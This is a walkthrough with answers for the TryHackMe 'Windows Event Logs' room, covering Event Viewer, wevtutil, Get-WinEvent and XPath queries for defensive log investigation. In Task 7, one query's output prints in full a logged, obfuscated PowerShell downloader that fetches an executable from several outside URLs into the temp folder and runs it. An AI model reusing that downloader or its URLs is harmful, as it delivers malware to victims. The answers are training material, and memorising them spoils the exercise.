---
title: Windows Event Logs
author: CYB3RM3
name: CYB3RM3 | Windows Event Logs
date: 2022-01-04 23:29:18 +0100
categories: [TryHackMe, Windows]
tags: [Windows, Event Logs]
---

Introduction to Windows Event Logs and the tools to query them.

THM Room [https://tryhackme.com/room/windowseventlogs](https://tryhackme.com/room/windowseventlogs)


## TASK 1 : What are event logs?
### Let's begin...
No Answer

## TASK 2 : Event Viewer
### For the questions below, use Event Viewer to analyze Microsoft-Windows-PowerShell/Operational log.
No Answer

### What is the Event ID for the first event?
Answer : 40961

### Filter on Event ID 4104. What was the 2nd command executed in the PowerShell session?
Use the filter curent log option in the action pane.

![4104](/images/thm/windowseventlogs/windowseventlogs_1.png)
_4104_

Answer : whoami

### What is the Task Category for Event ID 4104?
Answer : Execute a remote command

### For the questions below, use Event Viewer to analyze the Windows PowerShell log.

![Windows PowerShell log](/images/thm/windowseventlogs/windowseventlogs_1.png)
_Windows PowerShell log_

No Answer

### What is the Task Category for Event ID 800?
Answer : pipeline execution details

## TASK 3 : wevtutil.exe
###  How many log names are in the machine? 

```powershell
PS C:\Users\Administrator> wevtutil el | Measure-Object

Count : 1071
Average :
Sum :
Maximum :
Minimum :
Property :
[...]
```
{: .nolineno }

Answer : 1071



### What is the definition for the query-events command?

```console
C:\Users\Administrator>wevtutil qe /?
Read events from an event log, log file or using structured query.
[...]
```
{: .nolineno }

Answer : Read events from an event log, log file or using structured query.

### What option would you use to provide a path to a log file?

```powershell
PS C:\Users\Administrator> wevtutil qe /?
Read events from an event log, log file or using structured query.

Usage:
wevtutil { qe | query-events } <PATH> [/OPTION:VALUE [/OPTION:VALUE] ...]

<PATH>
By default, you provide a log name for the <PATH> parameter. However, if you use
the /lf option, you must provide the path to a log file for the <PATH> parameter.
If you use the /sq parameter, you must provide the path to a file containing a
structured query.
[...]
/{lf | logfile}:[true|false]
If true, <PATH> is the full path to a log file.
[...]
```
{: .nolineno }

Answer : /lf:true

###  What is the VALUE for /q?

```powershell
[...]
/{q | query}:VALUE
VALUE is an XPath query to filter events read. If not specified, all events will
be returned. This option is not available when /sq is true.
[...]
```
{: .nolineno }

Answer : XPath query

### The questions below are based on this command: wevtutil qe Application /c:3 /rd:true /f:text
No Answer

### What is the log name?

```powershell
PS C:\Users\Administrator> wevtutil qe Application /c:3 /rd:true /f:text
Event[0]:
  Log Name: Application
[...]
```
{: .nolineno }

Answer : Application

### What is the /rd option for?

```powershell
[...]
/{rd | reversedirection}:[true|false]
Event read direction. If true, the most recent events are returned first.
[...]
```
{: .nolineno }

Answer : Event read direction

### What is the /c option for?

```powershell
[...]
/{c | count}:<n>
Maximum number of events to read.
[...]
```
{: .nolineno }

Answer : Maximum number of events to read

## TASK 4 : Get-WinEvent
### Answer the following questions using the online help documentation for Get-WinEvent
Using online documentation  <https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/Get-WinEvent?view=powershell-7.1>

No Answer.

### Execute the command from Example 1 (as is). What are the names of the logs related to OpenSSH? 

```powershell
PS C:\Users\Administrator> Get-WinEvent -ListLog * | findstr "OpenSSH"
Circular             1052672           0 OpenSSH/Admin
Circular             1052672           0 OpenSSH/Operational
```
{: .nolineno }

Answer : OpenSSH/Admin,OpenSSH/Operational



### Execute the command from Example 7. Instead of the string *Policy* search for *PowerShell*. What is the name of the 3rd log provider?

```powershell
PS C:\Users\Administrator> Get-WinEvent -ListProvider *PowerShell*
[...]
Name     : Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager
LogLinks : {Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager/Operational,
           Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager/Analytic,
           Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager/Debug}
[...]
```
{: .nolineno }

Answer : Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager



### Execute the command from Example 8. Use Microsoft-Windows-PowerShell as the log provider. How many event ids are displayed for this event provider?

```powershell
PS C:\Users\Administrator> (Get-WinEvent -ListProvider Microsoft-Windows-PowerShell).Events | Format-Table Id, Description | Measure-Object

Count : 192
```
{: .nolineno }

Answer : 192

### How do you specify the number of events to display?

![MaxEvents](/images/thm/windowseventlogs/windowseventlogs_3.png)
_MaxEvents_

Answer : -MaxEvents

### When using the FilterHashtable parameter and filtering by level, what is the value for Informational?
Answer : 4

## TASK 5 : XPath Queries
### Using Get-WinEvent and XPath, what is the query to find WLMS events with a System Time of 2020-12-15T01:09:08.940277500Z?
Regarding the following query :

```powershell
Get-WinEvent -LogName Application -FilterXPath '*/System/EventID=101 and */System/Provider[@Name="WLMS"]'
```
{: .nolineno }

We just need to change one condition by the < TimeCretead SystemTime> XML flag using the same method as for the < Provider Name> XML tag.

Answer : 

```powershell
Get-WinEvent -LogName Application -FilterXPath '*/System/Provider[@Name="WLMS"] and */System/TimeCreated[@SystemTimee="2020-12-15T01:09:08.940277500Z"]'
```
{: .nolineno }

### Using Get-WinEvent and XPath, what is the query to find a user named Sam with an Logon Event ID of 4720?
Regarding the following query :

```powershell
Get-WinEvent -LogName Security -FilterXPath '*/EventData/Data[@Name="TargetUserName"]="System"'
```
{: .nolineno }

We need to change the name of the user and add the EventID=4720 condition.

Answer : 
```powershell
Get-WinEvent -LogName Security -FilterXPath '*/System/EventID=4720 and */EventData/Data[@Name="TargetUserName"]="Sam"'
```
{: .nolineno }

### Based on the previous query, how many results are returned?

```powershell
PS C:\Users\Administrator> Get-WinEvent -LogName Security -FilterXPath '*/System/EventID=4720 and */EventData/Data[@Name="TargetUserName"]="Sam"'


   ProviderName: Microsoft-Windows-Security-Auditing

TimeCreated                     Id LevelDisplayName Message
-----------                     -- ---------------- -------
12/17/2020 1:57:14 PM         4720 Information      A user account was created....
12/17/2020 1:56:58 PM         4720 Information      A user account was created....
```
{: .nolineno }

Answer : 2



### Based on the output from the question #2, what is Message?
Answer : A user account was created

### Still working with Sam as the user, what time was Event ID 4724 recorded? (MM/DD/YYYY H:MM:SS [AM/PM])

```powershell
PS C:\Users\Administrator> Get-WinEvent -LogName Security -FilterXPath '*/System/EventID=4724 and */EventData/Data[@Name="TargetUserName"]="Sam"'


   ProviderName: Microsoft-Windows-Security-Auditing

TimeCreated                     Id LevelDisplayName Message
-----------                     -- ---------------- -------
12/17/2020 1:57:14 PM         4724 Information      An attempt was made to reset an account's password....
```
{: .nolineno }

Answer : 12/17/2020 1:57:14 PM

### What is the Provider Name?
Answer : Microsoft-Windows-Security-Auditing

## TASK 6 : Event IDs
### I'm ready to look at some event logs... 
No Answer

## TASK 7 : Putting theory into practice
### What event ID is to detect a PowerShell downgrade attack? 
Some external research has led me to Lee Holmes website <https://www.leeholmes.com/detecting-and-preventing-powershell-downgrade-attacks/>:

![PowerShell downgrade attack](/images/thm/windowseventlogs/windowseventlogs_4.png)
_PowerShell downgrade attack_

Answer : 400

### What is the Date and Time this attack took place? (MM/DD/YYYY H:MM:SS [AM/PM])
Based on above script from Lee Holmes and adding the "-Path" option to the log on the Desktop and removing the "-LogName" part :

```powershell
PS C:\Users\Administrator> Get-WinEvent -path "C:\Users\Administrator\Desktop\merged.evtx" |
>> Where-Object Id -eq 400 |
>> Foreach-Object {
>>      $version = [Version] ($_.Message -replace '(?s).*EngineVersion=([\d\.]+)*.*','$1')
>>      if($version -lt ([Version] "5.0")) { $_ }
>> }


   ProviderName: PowerShell

TimeCreated                     Id LevelDisplayName Message
-----------                     -- ---------------- -------
12/18/2020 7:50:33 AM          400 Information      Engine state is changed from None to Available. ...
```
{: .nolineno }

Answer : 12/18/2020 7:50:33 AM

### A Log clear event was recorded. What is the 'Event Record ID'?

Researchs <https://docs.microsoft.com/en-us/answers/questions/342398/windows-event-logs-clea.html> gives me the "EventID" of the "Clear event Log" : 104. I use this to query the saved log merged.evtx :

```powershell
PS C:\Users\Administrator> Get-WinEvent -path "C:\Users\Administrator\Desktop\merged.evtx" -FilterXPath '*/System/EventID=104'


   ProviderName: Microsoft-Windows-Eventlog

TimeCreated                     Id LevelDisplayName Message
-----------                     -- ---------------- -------
3/19/2019 4:34:25 PM           104 Information      The System log file was cleared.
```
{: .nolineno }

Then checking the XML view from this particular event, i retreived the "EventRecordID" and "Computer" name :

![EventID 104](/images/thm/windowseventlogs/windowseventlogs_5.png)
__EventID 104__

Answer : 27736

### What is the name of the computer?
Answer : PC01.Example.corp

### What is the name of the first variable within the PowerShell command?
For this question, i adapt my query from the clear log question :

```powershell
PS C:\Users\Administrator> Get-WinEvent -path "C:\Users\Administrator\Desktop\merged.evtx" -FilterXPath '*/System/EventID=4104' -Oldest -MaxEvents 1 | fl


TimeCreated  : 8/25/2020 10:09:28 PM
ProviderName : Microsoft-Windows-PowerShell
Id           : 4104
Message      : Creating Scriptblock text (1 of 1):
               $Va5w3n8=(('Q'+'2h')+('w9p'+'1'));&('ne'+'w-'+'item') $eNV:teMP\WOrd\2019\ -itemtype
               DIrectOry;[Net.ServicePointManager]::"SecURi`T`ypRO`T`oCOL" = ('t'+'ls'+'1'+('2, tl'+'s')+'11'+(',
               '+'tls'));$Depssu0 = (('D'+'yx')+('x'+'ur4g')+'x');$A74_j9r=('T'+'4'+('gf45'+'h'));$Fdkhtf_=$env:temp+((
               '{0}'+'word{'+'0}'+('2'+'01')+'9{0}') -F
               [CHAr]92)+$Depssu0+('.'+('ex'+'e'));$O39nj1p=('J6'+'9l'+('hm'+'h'));$Z8i525z=&('new-'+'obje'+'c'+'t') ne
               T.WEbcLiENt;$Iwmfahs=(('h'+'ttp')+(':'+'//')+('q'+'u'+'anticaelectro'+'n'+'ic')+('s.com'+'/')+'w'+'p-'+'
               a'+('d'+'min')+'/'+'7A'+('Tr78'+'/*'+'htt')+('p'+'s:/')+('/r'+'e')+'be'+('l'+'co')+'m'+'.'+('ch/'+'pi'+'
               c')+('ture'+'_')+('l'+'ibra'+'ry/bbCt')+('l'+'S/')+('*ht'+'tp'+'s:/')+('/re'+'al')+'e'+'s'+('tate'+'a')+
               ('gen'+'t')+'te'+('am.co'+'m')+'/'+('163/Q'+'T')+'d'+('/'+'*ht'+'tps:')+'//'+('w'+'ww.')+('ri'+'dd')+('h
               i'+'display.'+'c'+'o')+'m/'+'r'+'id'+'d'+('hi'+'/1pKY/'+'*htt')+'p'+(':'+'//')+('radi'+'osu'+'bmit.com/'
               +'sear')+('ch_'+'tes'+'t')+'/'+'p'+('/*'+'h')+('ttp'+':/')+'/'+('res'+'e')+'ar'+('ch'+'c')+'he'+'m'+('pl
               u'+'s.'+'c')+('om/w'+'p-')+('a'+'dmin')+'/1'+('OC'+'C')+'/'+('*http:'+'/')+('/s'+'zymo')+('ns'+'zyp')+'e
               r'+('sk'+'i')+('.'+'pl/a')+'ss'+('ets/'+'p')+'k/')."S`Plit"([char]42);$Zxnbryr=(('Dp'+'z9')+'4'+'a6');fo
               reach($Mqku5a2 in $Iwmfahs){try{$Z8i525z."d`OWN`load`FIlE"($Mqku5a2,
               $Fdkhtf_);$Lt8bjj7=('Ln'+('wp'+'ag')+'m');If ((.('Get-I'+'t'+'em') $Fdkhtf_)."le`NgTH" -ge 28315) {cp
               (gcm calc).path $Fdkhtf_ -Force; .('Invo'+'ke'+'-Item')($Fdkhtf_);$Nfgrgu9=(('Qj6'+'bs')+'x'+'n');break;
               $D7ypgo1=('Bv'+('e'+'bc')+'k0')}}catch{}}$Gmk6zmk=(('Z2x'+'aaj')+'0')

               ScriptBlock ID: fdd51159-9602-40cb-839d-c31039ebbc3a
               Path:
```
{: .nolineno }

Answer : $Va5w3n8

### What is the Date and Time this attack took place? (MM/DD/YYYY H:MM:SS [AM/PM])
Date in the last query.

Answer : 8/25/2020 10:09:28 PM

### What is the Execution Process ID?
Cheching the event at the date 8/25/2020 10:09:28 PM : 

![EventID 4104](/images/thm/windowseventlogs/windowseventlogs_6.png)
__EventID 4104__

Answer : 6620

### What is the Group Security ID of the group she enumerated?

Per Microsoft documentation <https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers>, the administrators SID is S-1-5-32-544 :

Answer : S-1-5-32-544

### What is the event ID?
I build a query with the search on "Where-Object Message -Match "enumerated*" and got multiple answer but only one interesting with administrator group : 

```powershell
PS C:\Users\Administrator> Get-WinEvent -path "C:\Users\Administrator\Desktop\merged.evtx" | Where-Object Message -Match "enumerated*"


   ProviderName: Microsoft-Windows-Security-Auditing

TimeCreated                     Id LevelDisplayName Message
-----------                     -- ---------------- -------
12/18/2020 9:09:01 AM         4798 Information      A user's local group membership was enumerated....
12/18/2020 9:08:26 AM         4798 Information      A user's local group membership was enumerated....
12/18/2020 9:07:40 AM         4798 Information      A user's local group membership was enumerated....
12/18/2020 9:06:23 AM         4798 Information      A user's local group membership was enumerated....
12/18/2020 7:49:47 AM         4799 Information      A security-enabled local group membership was enumerated....
12/18/2020 7:49:47 AM         4799 Information      A security-enabled local group membership was enumerated....
```
{: .nolineno }

Answer : 4799

## TASK 8 : Conclusion 
### Hope you enjoyed this room and learned a thing or two. 
No Answer.
